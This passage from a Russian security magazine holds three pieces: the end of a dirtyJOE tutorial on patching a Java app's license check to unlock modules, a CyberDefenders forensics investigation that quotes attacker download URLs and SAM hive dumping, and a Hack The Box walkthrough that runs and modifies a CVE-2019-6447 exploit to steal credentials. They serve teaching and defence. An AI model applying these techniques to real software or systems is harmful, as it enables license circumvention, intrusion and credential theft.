138: getfield      #4         // Field modulesItems:Ljava/util/
concurrent/ConcurrentMap;
141: iconst_1
142: invokestatic  #10        // Method java/lang/Integer.valueOf:(I)
Ljava/lang/Integer;
145: aload_1
146: invokeinterface #55,  3  // InterfaceMethod java/util/
concurrent/ConcurrentMap.put:(Ljava/lang/Object;Ljava/lang/Object;)
Ljava/lang/Object;
151: pop
152: getstatic     #31        // Field log:Lorg/slf4j/Logger;
155: ldc           #56        // String Default module loaded {}
157: aload_1
158: invokevirtual #57        // Method com/license/modules/
BaseModule.getName:()Ljava/lang/String;
161: invokeinterface #58,  3  // InterfaceMethod org/slf4j/Logger.
info:(Ljava/lang/String;Ljava/lang/Object;)V
166: aload_0
167: iconst_1
168: invokespecial #49        // Method onModuleUpdated:(I)V
171: return                   // Последняя контрольная точка: сюда
условный переход из #129, стек пуст, локальные переменные те же

Теперь рассмотрим карту стека, которую компилятор сгенерировал для дан‐
ной процедуры. К сожалению, dirtyJOE достаточно старый и сырой инстру‐
мент, чтобы править или хотя бы отображать карту стека. Максимум, что он
может показать, — это ее наличие в виде атрибута метода StackMapTable.
Поэтому для просмотра карты стека воспользуемся стандартной утилитой
javap из пакета JDK:


"C:\Program Files\Java\jdk-17.0.1\bin\javap.exe" -v LicenseModules.
class



  StackMapTable: number_of_entries = 6    <----- Шесть фреймов всего
  frame_type = 252 /* append */                 <----- Первая точка, тип
  append означает, что фрейм имеет те же локальные переменные, что и
  предыдущий (которого у нас нет, так как фрейм первый), за исключением
  того, что определены k дополнительных локальных переменных и что стек
  операндов пуст. Значение k определяется формулой frame_type – 251 = 252
  – 251 = 1, локальная переменная
  offset_delta = 23                                <----- Смещение от
  начала модуля
  locals = [ class java/util/Iterator ]       <----- Тип локальной
  переменной
  frame_type = 252 /* append */            <---- То же самое, что и
  предыдущий, но добавилась локальная переменная 252 – 251 = 1
  offset_delta = 37                                <----- Смещение от
  предыдущего фрейма, то есть 24 + 37 = 61
  locals = [ class java/util/Map$Entry ]  <----- Тип новой локальной
  переменной
  frame_type = 249 /* chop */                  <---- Такой тип фрейма
  имеет те же локальные переменные, что и предыдущий фрейм, за исключением
  того, что отсутствуют последние k локальных переменных и что стек
  операндов пуст. Значение k определяется формулой 251 – frame_type = 251
  – 249 = 2, две локальные переменные убираются
  offset_delta = 36                                  <----- Смещение от
  предыдущего фрейма, то есть 62 + 36 = 98
  frame_type = 2 /* same */                     <----- Этот тип фрейма
  указывает, что фрейм имеет точно такие же локальные переменные, что и
  предыдущий фрейм, и что стек операндов пуст. Смещение определяется
  типом, то есть 99 + 2 = 101
  frame_type = 20 /* same */                   <----- То же, что и
  предыдущий, смещение 102 + 20 = 122
  frame_type = 48 /* same */                   <----- То же, что и
  предыдущий, смещение 123 + 48 = 171


Итак, я надеюсь, мне удалось донести в этом примере логику работы верифи‐
катора через stack map. Что нам это дает на практике? Во‑первых, становится
понятно, почему не работает наш первоначальный патч isDemo: исходный код
был линейным и никакой верификации через фреймы стека ему не требова‐
лось, а наша правка мало того, что добавила контрольную точку (следующий
байт за глухим ireturn), так еще и сделала хвост метода безумным для ком‐
пилятора. Поскольку способа быстро и просто укоротить размер кода метода
через dirtyJOE нет, то самый простой метод добиться успешного прохож‐
дения нашим кодом верификации — забить все тело nop’ами и только в кон‐
це оставить return false:


00000000 : nop
00000001 : nop
00000002 : nop
00000003 : nop
00000003 : nop
00000005 : iconst_0
00000006 : ireturn

Вообще говоря, стратегия патча в данном случае — следить за контрольными
точками фреймов стека и при правке кода стараться не выходить за их пре‐
делы или хотя бы следить, чтобы классы локальных переменных и значений
на  стеке  после  правки  соответствовали  друг  другу.  Можно,  конечно,
при желании править и сами атрибуты StackMapTable в шестнадцатеричном
редакторе, но этот крайний случай мы оставим для другой статьи. Чуть
не забыл напомнить, что при сложной правке стоит учитывать верификацию
области видимости локальных переменных (атрибут localVariableTable)
и блоков обработки исключений (окно Exceptions). По счастью, редактирова‐
ние этих параметров достаточно элементарно и поддерживается в dirtyJOE.





                    Редактирование параметров в dirtyJOE

Может показаться, что учесть все вышеописанные требования — чудовищно
сложная задача, особенно когда метод использует весьма разветвленную
логику, а правки увеличивают размер кода. Тем не менее это только на пер‐
вый взгляд: при достаточной сноровке вполне реально найти необязательные
места в коде, благодаря оптимизации которых можно расширить нужные. Я
специально выбрал такой метод (setDefault), в котором за счет разницы
в  длинах команд  (команда iconst_1  занимает один  байт, а  команда
для замены sipush 256 — целых три) код существенно удлиняется. Тем
не менее, имея представление о принципах верификации, даже в этом случае
достаточно быстро можно смастерить хоть и не идеальный, но вполне
рабочий патч, корректно проходящий верификацию и открывающий нужный
режим в программе:


00000000  2A  aload_0
00000001  04  iconst_1
00000002  B6 00 33  invokevirtual       boolean com.license.modules.
LicenseModules.hasModule( int)
00000005  99 00 60  ifeq                pos.00000065
00000008  2A  aload_0
00000009  B4 00 04  getfield            java.util.concurrent.
ConcurrentMap com.license.modules.LicenseModules.modulesItems
0000000C  B9 00 14 01 00  invokeinterface     java.util.Set java.
util.concurrent.ConcurrentMap.entrySet() , 1
00000011  B9 00 15 01 00  invokeinterface     java.util.Iterator
java.util.Set.iterator() , 1
00000016  4C  astore_1
00000017  2B  aload_1
00000018  B9 00 16 01 00  invokeinterface     boolean java.util.
Iterator.hasNext() , 1
0000001D  99 00 45  ifeq                pos.00000062
00000020  2B  aload_1
00000021  B9 00 17 01 00  invokeinterface     java.lang.Object java.
util.Iterator.next() , 1
00000026  C0 00 18  checkcast           java.util.Map$Entry
00000029  4D  astore_2
0000002A  2C  aload_2
0000002B  B9 00 2E 01 00  invokeinterface     java.lang.Object java.
util.Map$Entry.getKey() , 1
00000030  C0 00 2F  checkcast           java.lang.Integer
00000033  B6 00 30  invokevirtual       int java.lang.Integer.
intValue()
00000036  04  iconst_1
00000037  A0 00 06  if_icmpne           pos.0000003D
0000003A  A7 FF DD  goto                pos.00000017
0000003D  2C  aload_2
0000003E  B9 00 19 01 00  invokeinterface     java.lang.Object java.
util.Map$Entry.getValue() , 1
00000043  C0 00 08  checkcast           com.license.modules.
BaseModule
00000046  B6 00 2C  invokevirtual       void com.license.modules.
BaseModule.close()
00000049  2B  aload_1
0000004A  B9 00 2D 01 00  invokeinterface     void java.util.
Iterator.remove() , 1
0000004F  2A  aload_0
00000050  2C  aload_2
00000051  B9 00 2E 01 00  invokeinterface     java.lang.Object java.
util.Map$Entry.getKey() , 1
00000056  C0 00 2F  checkcast           java.lang.Integer
00000059  B6 00 30  invokevirtual       int java.lang.Integer.
intValue()
0000005C  B7 00 31  invokespecial       void com.license.modules.
LicenseModules.onModuleUpdated( int)
0000005F  A7 FF B8  goto                pos.00000017
00000062  A7 00 49  goto                pos.000000AB
00000065  2A  aload_0
00000066  B7 00 34  invokespecial       void com.license.modules.
LicenseModules.closeModules()
00000069  2A  aload_0
0000006A  B4 00 07  getfield            java.util.Map com.license.
modules.LicenseModules.modulesConfig
0000006D  04  iconst_1
0000006E  B8 00 0A  invokestatic        java.lang.Integer java.lang.
Integer.valueOf( int)
00000071  B9 00 1B 02 00  invokeinterface     boolean java.util.Map.
containsKey(java.lang.Object) , 2
00000076  9A 00 04  ifne                pos.0000007A
00000079  B1  return
0000007A  2A  aload_0
0000007B  11 01 00  sipush              256
0000007E  B7 00 35  invokespecial       com.license.modules.
BaseModule com.license.modules.LicenseModules.getModule( int)
00000081  4C  astore_1
00000082  00  nop
00000083  00  nop
00000084  2B  aload_1
00000085  04  iconst_1
00000086  B6 00 36  invokevirtual       void com.license.modules.
BaseModule.setEnabled(boolean)
00000089  2A  aload_0
0000008A  B4 00 04  getfield            java.util.concurrent.
ConcurrentMap com.license.modules.LicenseModules.modulesItems
0000008D  11 01 00  sipush              256
00000090  B8 00 0A  invokestatic        java.lang.Integer java.lang.
Integer.valueOf( int)
00000093  2B  aload_1
00000094  B9 00 37 03 00  invokeinterface     java.lang.Object java.
util.concurrent.ConcurrentMap.put(java.lang.Object, java.lang.Object)
, 3
00000099  57  pop
0000009A  2A  aload_0
0000009B  11 01 00  sipush              256
0000009E  00  nop
0000009F  B7 00 31  invokespecial       void com.license.modules.
LicenseModules.onModuleUpdated( int)
000000A2  00  nop
000000A3  00  nop
000000A4  00  nop
000000A5  00  nop
000000A6  00  nop
000000A7  00  nop
000000A8  00  nop
000000A9  00  nop
000000AA  00  nop
000000AB  B1  return

Как видишь, несмотря на сырость и заброшенность проекта (последняя вер‐
сия  1.7  (c529) была  опубликована на  официальном  сайте аж в  кон‐
це 2014 года), dirtyJOE представляет собой весьма полезный инструмент,
незаменимый для патча обфусцированных проектов и приложений, накрытых
протекторами. Помимо описанных выше, у него масса других полезных фич:
с его помощью можно редактировать и добавлять новые константы и поля
(можно добавлять даже новые методы, правда пустые). Для расшифровки
криптованных строк есть возможность подключить пользовательские скрипты
на питоне, сама программа имеет 32- и 64-битные версии и даже существует
в виде плагина к Total Commander. Надеюсь, что знакомство с данной ути‐
литой поможет тебе осваивать реверс и патчинг JVM-приложений.
ВЗЛОМ





                                                                                     rayhunt454
                                                                                      grigadan454@gmail.com
        УРОКИ
   ФОРЕНЗИКИ

          РАССЛЕДУЕМ КИБЕРИНЦИДЕНТ
                  CYBERCORP CASE 1





Специалисты  по  атакующей  безопасности  оттачивают
навыки на Hack The Box, Root Me и VulnHub, а специально
для  защитников  существует  платформа  CyberDefenders.
В этой статье я покажу ход расследования киберинцидента
на примере  лабораторной работы с  этого  ресурса —
CyberCorp Case 1.


Мы научимся получать необходимые данные из основных артефактов опе‐
рационной системы Windows. Наша задача — понять, как злоумышленник
скомпрометировал компьютер в сети организации, как закрепился в системе,
какие вредоносные файлы использовал и к каким объектам локальной сети
получил доступ.
   По сценарию кейса в исходящем трафике инфраструктуры компании
CyberCorp выявлен ряд аномалий, что свидетельствует о ее компрометации.
Специалисты по реагированию на компьютерный инцидент изолировали
один из потенциально скомпрометированных хостов от корпоративной сети
и собрали основные  артефакты Windows. Файлы  артефактов  находятся
в архиве, который необходимо загрузить.
   По результатам решения кейса нас попросят ответить на ряд вопросов. Я
покажу лишь ход решения и не буду подсвечивать ответы. Ради тренировки
можешь повторить весь процесс самостоятельно и ответить — для закрепле‐
ния материала.


ПОЛУЧЕННЫЕ АРТЕФАКТЫ WINDOWS
 1. Amcache.hve — файл реестра, содержащий информацию о запускаемых
    приложениях. Начиная с Windows 8 и Windows Server 2012 путь к файлу
   реестра Amcache хранится в \%SystemRoot%\AppCompat\Programs\
   Amcache.hve.
 2. AppCompatCache.reg —  информация  из   ключа  HKLM\SYSTEM\
   CurrentControlSet\Control\Session Manager\AppCompatCache\
   AppCompatCache  куста  реестра  SYSTEM   (C:\Windows\System32\
   configSystem). В данном  ключе  хранится  артефакт Shimcache —
   это механизм, который обеспечивает обратную совместимость старых
   приложений с более новыми версиями Windows. В нем содержится сле‐
   дующая информация: путь к исполняемому файлу, размер файла, время
    последнего изменения.
 3. Файлы реестра: default, SAM, SECURITY, software, system. Рас‐
   положены эти файлы в каталоге C:\Windows\System32\config.
 4. Memdump — файл образа оперативной памяти.
 5. Logs — файлы логов операционной системы. Они находятся в каталоге
   C:\Windows\System32\winevt\Logs.
 6. User Registry Hives — файл NTUSER.DAT содержит информацию, связан‐
   ную с действием пользователя. Файлы NTUSER.DAT хранятся в каталоге
   %userprofile%.
 7. Windows Prefetch — файлы, предназначенные для ускорения запуска при‐
   ложений. Файлы Prefetch содержат имя исполняемого файла, список
   динамических библиотек, используемых исполняемым файлом, количес‐
   тво запусков исполняемого файла и метку времени, указывающую, когда
   программа была запущена в последний раз. Данные файлы хранятся
   в каталоге C:\Windows\Prefetch.
 8. MFT (главная таблица файлов) — системный файл, содержащий метадан‐
   ные объекта файловой системы. Этот файл расположен в корне каждого
   раздела NTFS, выгрузить его можно с помощью FTK Imager.
 9. OBJECTS.DATA — файл, содержащий постоянные классы WMI (Windows
   Management   Instrumentation).  Он  расположен  в  %SystemRoot%\
   System32\wbem\Repository.
10. Сетевой трафик, полученный в результате мониторинга инфраструктуры
   компании.


ЭТАПЫ РАССЛЕДОВАНИЯ
 1. Поиск точки входа в систему. На данном этапе выясним, как злоумыш‐
   ленник скомпрометировал систему и какие использовал вредоносные
   файлы.
 2. Поиск способа закрепления. Выясним, как злоумышленники обеспечили
   себе постоянный доступ к системе.
 3. Поиск методов бокового перемещения по сети. На этом этапе выявим
   действия злоумышленника после получения доступа к скомпрометирован‐
   ному компьютеру.


ИСПОЛЬЗУЕМЫЕ УТИЛИТЫ
 1. Утилиты  Эрика  Циммермана: AmcacheParser,  Registry  Explorer,
   AppCompatCacheParser, MFTECmd.
 2. Утилиты NirSoft: fulleventlogview, winprefetchview.
 3. UserAssist.
 4. Wireshark — инструмент для анализа сетевых протоколов.
 5. Olevba — инструмент для извлечения и анализа исходного кода макросов
   VBA из документов MS Office (OLE и OpenXML).
 6. Volatility 3 — инструмент для извлечения данных из образа оперативной
   памяти.

Перед тем как начать изучать артефакты скомпрометированного компьютера,
получим информацию о версии операционной системы, дату установки, имя
пользователя. Для этого загрузим куст реестра software в утилиту Registry
Explorer  и  перейдем   к   ключу  SOFTWARE\Microsoft\Windows   NT\
CurrentVersion.





                 Информация об исследуемом компьютере

На исследуемом компьютере установлена операционная система Windows 10
Enterprise Evaluation, дата установки — 17 июня 2020 года в 7:13:49 (параметр
InstallDate), версия сборки — 17134, владелец — John Goldberg.


                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИВЗЛОМ
   УРОКИ ФОРЕНЗИКИ
          РАССЛЕДУЕМ КИБЕРИНЦИДЕНТ CYBERCORP
                                       CASE 1





ПОИСК ТОЧКИ ВХОДА
На данном этапе исследуем образ оперативной памяти, сетевой трафик
и главную таблицу разделов.


Анализ образа оперативной памяти
Найдем активные сетевые соединения и вредоносный процесс. Для этого
воспользуемся утилитой Volatility 3.
   Выявим все сетевые соединения с состоянием ESTABLISHED и проверим
все IP-адреса на VirusTotal.


python3 vol.py -f memdump.mem windows.netscan.NetScan


                     Вредоносное сетевое соединение

Процесс rundll32.exe (PID процесса — 4224) установил сетевое соеди‐
нение с управляющим сервером по адресу 196.6.112.70. Ознакомимся
с результатом проверки выбранного адреса на VirusTotal.
   Получим дерево процессов и найдем процесс с идентификатором 4224.


python3 vol.py -f memdump.mem windows.pstree.PsTree


                  Информация о вредоносном процессе

Родительский идентификатор вредоносного процесса rundll32.exe — 7320,
но процесса с таким идентификатором не обнаружено.
   Воспользуемся плагином malfind утилиты Volatility 3 и найдем код, внед‐
ренный в адресное пространство процессов операционной системы.


python3 vol.py -f memdump.mem windows.malfind.Malfind





                         Результат работы плагина malfind

Из рисунка выше видно, что вредоносный код внедрен в адресное прос‐
транство процесса winlogon.exe (PID 3232).
   Отлично! Мы обнаружили управляющий центр и вредоносный процесс.


Анализ сетевого трафика
Проанализируем сетевой трафик при помощи Wireshark и найдем интерес‐
ные  артефакты. В первом дампе трафика обнаружена почтовая сессия
по протоколу SMTP. Попробуем получить сообщения eml. Для этого перехо‐
дим на вкладку «Файл → Экспортировать объекты → IMF». Сохраним все сооб‐
щения для исследования.





           Список сообщений, обнаруженных в сетевом трафике

В сообщении от richard.gorn@gmail.com содержится запароленный архив
attach.zip. Исследуем файлы из него.





                        Содержимое сообщения

Как видишь, пароль от архива нашелся в письме.


Анализ вредоносных файлов
В архиве лежит документ Why Saudi Arabia Will Lose The Next Oil
Price War.docx (MD5: aa7ee7f712780aebe9136cabc24bf875). Меняем рас‐
ширение на .zip и смотрим его содержимое. Вредоносных макросов здесь
нет, но в файле ./word/_rels/settings.xml.rels обнаружилась ссылка
на  загрузку шаблона Supplement.dotm. Такой  вектор  атаки называется
Remote Template Injection и подробно описан в блоге Сунгвана Цоя.
   Основной принцип атаки заключается в следующем. Злоумышленники
залили на свой сервер файл шаблона документа Word (.dotm) и внедрили
в код документа Why Saudi Arabia... .docx ссылку на загрузку вредонос‐
ного шаблона. Если документ открыть, загрузится шаблон, содержащий мак‐
рос.




             Адрес для загрузки вредоносного документа .dotm

Попробуем получить этот документ из образа оперативной памяти. Для этого
воспользуемся плагином FileScan утилиты Volatility 3.


python3 vol.py -f memdump.mem windows.filescan.FileScan | grep dotm





  Документы с расширением dotm, выявленные в образе оперативной
  памяти

Выгрузим документ, расположенный по адресу 0xcd8401aea3f0. Для этого
воспользуемся плагином dumpfiles утилиты Volatility 3.


python3 vol.py -f memdump.mem windows.dumpfiles.DumpFiles --virtaddr
0xcd8401aea3f0





                      Результаты работы плагина dumpfiles

Мы получили вредоносный шаблон Microsoft Office c длинным названием
и расширением .dotm.dat. Проанализируем шаблон c помощью утилиты
olevba. Переименуем его в dotm_malicious.


olevba dotm_malicious

В результате работы olevba мы получили скрипт на VBA, содержащийся
в шаблоне документа. Исследуем код скрипта.





                          Участок вредоносного кода

Вредоносный скрипт загружает полезную нагрузку master_page и сохраняет
ее в следующем ключе реестра:


HKEY_USERS\S-1-5-21-3899523589-2416674273-2941457644-1104\Software\
RegisteredApplications\AppXs42fd12c3po92dynnq2r142fs12qhvsmyy

Далее он загружает PowerShell-скрипт wrapper_page и сохраняет в каталог


C:\Users\john.golberg\AppData\Roaming\\Microsoft\Office\Recent\
tmpA7Z2.ps1

Следующим этапом происходит закрепление в системе с использованием
WMI, но об этом мы поговорим чуть позже.
   Выгрузим скрипт на PowerShell, чтобы изучить его содержимое.





                  Участок вредоносного скрипта tmp7AZ2.ps1

Скрипт берет полезную нагрузку из ключа реестра (переменная $rk), декоди‐
рует ее из Base64, а далее выполняется спуфинг родительского процесса
dwm.exe. Вредоносная нагрузка загружается в память созданного процесса
и мигрирует в процесс winlogon.exe.
   Выгрузим вредоносную нагрузку. Загрузим куст NTUSER.DAT пользователя
john.goldberg   в   утилиту  Reg   Explorer.  Перейдем   в  Software\
RegisteredApplications          и            найдем           ключ
AppXs42fd12c3po92dynnq2r142fs12qhvsmyy.





                           Вредоносная нагрузка

Декодируем  полезную  нагрузку,  получим  MD5-сумму  и  проверим  ее
на VirusTotal.


Анализ MFT
Разберем, в какое время пользователь открыл вредоносный документ Why
Saudi Arabia... .docx в системе, чтобы понимать, когда произошел инци‐
дент. Для этого проанализируем файл MFT. Воспользуемся инструментом
MFTECmd.exe и выгрузим информацию об объектах файловой системы в файл
CSV.


MFTECmd.exe -f $MFT.copy0 --csv .\RESULT\MFT

Мы получили файл, содержащий пути ко всем файлам файловой системы,
а также метки времени. Через поиск найдем информацию о документе Why
Saudi Arabia Will Lose The Next Oil Price War.docx. Все метки вре‐
мени в таблице MFT в UTC, но московское время — UTC+3.


          Информация о запуске вредоносного документа по UTC


             INFO

                   В таблице MFT представлены две метки времени
                          создания        файла:      STANDARD_INFO
                      и FILE_INFO. Злоумышленник использует ути‐
                      литы  антикриминалистики,  которые  изменяют
                            метку времени STANDARD_INFO, поэтому необ‐
                      ходимо смотреть на метку времени FILE_INFO.
                          Подробности описаны в блоге Cyb3rSn0rlax.


Итак, по результатам первого этапа мы обнаружили, что пользователь john.
goldberg получил по электронной почте сообщение, содержащее вредонос‐
ное вложение. 20.06.2020 в 22:27:31 (по московскому времени) пользователь
открыл документ Why Saudi Arabia... .docx, который загрузил шаблон c
http://75.19.45.11/Suplement.dotm, содержащий макрос. Вредоносный
макрос загрузил полезную нагрузку и PowerShell-скрипт.


ЗАКРЕПЛЕНИЕ В СКОМПРОМЕТИРОВАННОЙ СИСТЕМЕ
На этом этапе проанализируем файл OBJECTS.DATA, но сначала немного
поговорим о сохранении постоянства в системе с помощью WMI.
  WMI (Windows Management Instrumentation) — набор инструментов, пред‐
назначенных для управления системами Windows как локально, так и удален‐
но. Одна из техник закрепления в системе через WMI — это WMI Subscriptions
(подписки WMI). Эта техника запускает действие при возникновении события.
Действия и события могут быть определены пользователем. В определениях
WMI действия называются потребителями (Consumers), а события — филь‐
трами (Filters). Существует также третий компонент, который связывает их
вместе, — привязка (__FilterToConsumerBinding).
   Значит, наша задача — обнаружить в файле OBJECTS.DATA связку дей‐
ствия и события  (__FilterToConsumerBinding). Можно открыть  иссле‐
дуемый  файл  с  помощью  hex-редактора  и  в  поиске  вбить  строку
__FilterToConsumerBinding,    но   мы     воспользуемся     утилитой
PyWMIPersistenceFinder.


python PyWMIPersistenceFinder.py OBJECTS.DATA





              Результат работы утилиты PyWMIPersistenceFinder.py

Мы обнаружили название события LogRotate Event и название действия
Logrotate Consumer.
  При возникновении события авторизации пользователя в системе запус‐
кается действие — запуск вредоносного скрипта tmpA7Z2.ps1. Вредоносный
скрипт запускается, когда пользователь вводит логин и пароль от своей учет‐
ной записи и начинает работать в системе.


                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИВЗЛОМ
   УРОКИ ФОРЕНЗИКИ
          РАССЛЕДУЕМ КИБЕРИНЦИДЕНТ CYBERCORP
                                       CASE 1





БОКОВОЕ ПЕРЕМЕЩЕНИЕ ПО СЕТИ
Для анализа дальнейших действий злоумышленника воспользуемся логами
Windows.
   Загрузим каталог Logs в утилиту fulleventlogview.exe. Для этого перей‐
дем на вкладку File → Choose Data Source и укажем путь, где хранятся файлы
логов. Перейдем на вкладку Options → Advanced Options и установим, с какого
времени показать события операционной системы. В качестве начальной
точки укажем 20.06.2020 22:27:31 — это метка времени создания вре‐
доносного файла Why Saudi Arabia... .docx.





       Обращение к вредоносному ресурсу для получения шаблона

В 22:27:46 зафиксировано исходящее сетевое соединение к вредоносному
ресурсу 75.19.45.11, вызванное файлом winword.exe. Далее выполняется
вредоносный макрос, который содержится в загруженном шаблоне.





                    Загрузка утилит для постэксплуатации

В 22:31:08 злоумышленник загрузил с адреса http://196.6.112.70/disco.
jpg вспомогательные утилиты для бокового перемещения по сети и сохранил
их в файл C:\Windows\TEMP\disco.jpg.





          Декодирование загруженного файла по алгоритму Base64

В  22:31:16  декодировали  загруженный файл disco.jpg по  алгоритму
Base64 и сохранили в файл C:\Windows\TEMP\sh.exe.





                      Запуск исполняемого файла sh.exe

В  22:31:34  запустили  исполняемый  файл  sh.exe  (сборщик  данных
для BloodHound), результат работы которого сохранен в файл ddr.zip.
   Проанализируем таблицу MFT и посмотрим, какие еще файлы были соз‐
даны в каталоге C:\Windows\Temp. Для этого откроем полученный файл CSV,
содержащий объекты файловой системы, и найдем все файлы в каталоге
Windows\Temp.


            Файл, обнаруженный в каталоге C:\Windows\Temp

В 22:31:38 создан файл с расширением bin.
   Следующий этап для злоумышленника — получение логинов и паролей
пользователей.





  Список локальных администраторов скомпрометированного компьютера

В 22:33:10 перечислили всех локальных администраторов пользователей
скомпрометированного компьютера.





                     Сохранение куста реестра sam





                    Сохранение куста реестра system

В 22:33:18 злоумышленник с применением  утилиты reg.exe (программа
в Windows для настройки реестра) выгрузил куст реестра hklm\sam и сох‐
ранил его в файл C:\Windows\TEMP\sa.tmp. В 22:33:24 выгрузил куст реес‐
тра hklm\system и сохранил в файл C:\Windows\Temp\sy.tmp.
   Следующим этапом злоумышленник выгружает файлы sa.tmp и sy.tmp
и получает из них NTLM-хеши паролей пользователей. Теперь ему достаточно
пробрутить полученные хеши пользователей с имеющимся в его арсенале
словарем. Пароль !!feb15th2k6!! — словарный и есть в файле rockyou.txt.





             Запрос на получение адреса контроллера домена





    Получение доступа к административному ресурсу контроллера домена

В 22:35:38 злоумышленник узнал пароль !!feb15th2k6!!  пользователя
cybercorp\backupsrv и подключился к административному ресурсу \\192.
168.184.100\C$ контроллера домена, тем самым получив полный доступ
к домену. Ему осталось лишь загрузить вредоносный модуль на скомпро‐
метированный контроллер домена, чтобы закрепиться на нем.


ВЫВОДЫ
Мы с тобой расследовали киберинцидент и выявили такую картину. Злоумыш‐
ленник использовал письмо по электронной почте с вредоносным вложением
и скомпрометировал хост с адресом 192.168.100.130. Затем он загрузил
полезную  нагрузку, которую записал в реестр, и скрипт на PowerShell,
который запускается при вводе авторизационных данных в системе. Далее
злоумышленник  загрузил  утилиту для перечисления данных контроллера
домена, получил авторизационные данные пользователя cybercorp\backup
и скомпрометировал контроллер домена.
   Таким образом, мы восстановили полную картину действий, а значит,
наша работа как криминалистов закончена.
ВЗЛОМ

       HTB
 EXPLORE





      ПОВЫШАЕМ ПРИВИЛЕГИИ
        НА ANDROID ЧЕРЕЗ ADB





В  этой  статье  я  покажу,  как  захватить
машину  Explore,  основанную на  Android.
Поможет нам в этом уязвимость в фай‐
ловом менеджере ES File Explorer, а также
отладочный интерфейс ADB. Машина лег‐            RalfHacker                                                                                             hackerralf8@gmail.com
кая, но Android встречается на Hack The Box
нечасто, и это делает задачку интересной.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА. СКАНИРОВАНИЕ ПОРТОВ
Добавляем IP-адрес машины в /etc/hosts:


10.10.10.247    explore.htb

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта.


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$/ /)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Видим всего два открытых порта: 2222 (служба SSH) и пока неизвестный
для нас 59777 (на пояснение Nmap можно не смотреть, так как он просто
вывел информацию из своей базы). На SSH нам пока делать нечего, у нас нет
никаких ключей, учетных данных и вообще какой‑либо информации для сос‐
тавления списка паролей. Поэтому отправимся в Google и поищем сведения
про порт 59777.
   Узнаем, что открытый порт 59777 содержат версии ES  File  Explorer
4.1.9.5.2 и более ранние. ES File Explorer — это полнофункциональный менед‐
жер файлов для Android, и он годится как для локального, так и для сетевого
использования.


ТОЧКА ВХОДА. ПОИСК ЭКСПЛОИТОВ
Мы узнали, какая используется технология, а это значит, что можно поискать
готовые эксплоиты.

Справка: поиск готовых эксплоитов
При пентесте лучше всего искать эксплоиты при помощи Google, поскольку
этот поисковик заглядывает и в личные блоги, и в самые разные отчеты. Уско‐
рят дело специализированные базы вроде Exploit-DB — там часто можно
обнаружить подходящие варианты. Если ты работаешь в специализирован‐
ной ОС вроде Kali Linux, то эта база у тебя уже есть и для поиска можно
использовать утилиту searchsploit.



В Exploit-DB находим готовый код. Эксплуатируемая им уязвимость носит
идентификатор CVE-2019-6447. Из ее описания узнаем детали: приложение
запускает на устройстве скрытый HTTP-сервер, который позволяет получить
доступ к данным других пользователей, подключенных к той же сети в момент
запуска приложения.
   Скачиваем и пробуем запустить эксплоит. Нам сообщают, что в качестве
обязательных параметров нужно указать команду и адрес, также есть опция
для скачивания файлов.


                        Тестовый запуск эксплоита

Если просмотреть код эксплоита, мы сможем узнать о следующих поддержи‐
ваемых командах:
 • listFiles — получить список файлов в директории;
 • listPics — список изображений;
 • listVideos — список видеофайлов;
 • listAudios — список аудиофайлов;
 • listApps — список установленных приложений;
 • listAppsSystem — список системных приложений;
 • listAppsPhone — список приложений для связи;
 • listAppsSdcard — список приложений на карте SD;
 • listAppsAll — список всех приложений;
 • getFile — загрузить файл с устройства (для этого, видимо, и нужен тре‐
   тий параметр);
 • getDeviceInfo — получить информацию об устройстве.

Прежде чем ковыряться в файловой системе, нужно узнать, с чем мы работа‐
ем. Давай получим информацию об устройстве:


python3 50070.py getDeviceInfo explore.htb





                    Получение информации об устройстве

Информации немного, но видим корневую директорию ftpRoot — /sdcard.


ТОЧКА ОПОРЫ. МОДЕРНИЗАЦИЯ ЭКСПЛОИТА
Получить список файлов в заданной директории при помощи этого эксплоита
не выйдет, поэтому мне пришлось его немного доработать. Для этого нужно
просто добавить к URL каталог, к которому мы обращаемся. Я реализовал
это в третьем параметре, ниже приведен код, который следует добавить
в эксплоит.


if cmd == cmds[0]:
    if len(sys.argv) != 4:
        print("[+] Include dir for get list.")
        sys.exit(1)
    else:
        url += sys.argv[3]





                 Фрагмент оригинального кода эксплоита





              Фрагмент модернизированного кода эксплоита

А теперь в третьем параметре передадим каталог, содержимое которого мы
хотим получить.


python3 50070.py listFiles explore.htb /sdcard





                      Содержимое каталога sdcard





               Содержимое каталога sdcard (продолжение)

Находим файл user.txt, но забирать его пока рано, ведь мы не получили
управление. Можно посмотреть каталоги загрузок (Download) и документов
(Documents), также много интересного можем найти и в картинках. Но сперва
обратим внимание на две директории, дата изменения которых отличается
от остальных: dianxinos и DCIM. В первой ничего интересного, а вот в дирек‐
тории камеры есть интересный файл creds.


python3 50070.py listFiles explore.htb /sdcard/DCIM





                       Содержимое каталога DCIM

Эти же фотографии можно было обнаружить с помощью специальной под‐
держиваемой команды listPics.


python3 50070.py listPics explore.htb





                   Все найденные изображения

Загрузим интересующее нас изображение командой getFile.


python3 50070.py getFile explore.htb /sdcard/DCIM/creds.jpg





                         Загрузка файла с устройства

Просматриваем картинку и находим логин и пароль.





                          Загруженная фотография

Что характерно для такого рода задачек, эта учетка подходит к SSH. Таким
образом мы получаем флаг пользователя.



                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Сомневаюсь, что скрипты для поиска путей повышения привилегий вроде
LinPEAS сработают на Android, поэтому я решил проверять вручную. Первое,
на что я обратил внимание, — это система, но никаких эксплоитов для Android
этой версии обнаружить не удалось.


uname -a



                             Целевая система

Sudo в данной системе отсутствует, поэтому на привилегированные команды
без пароля можно не надеяться. А вот открытые для локального хоста порты
представляют такой же интерес, как и в случае с Windows или Linux.


netstat -tulpan





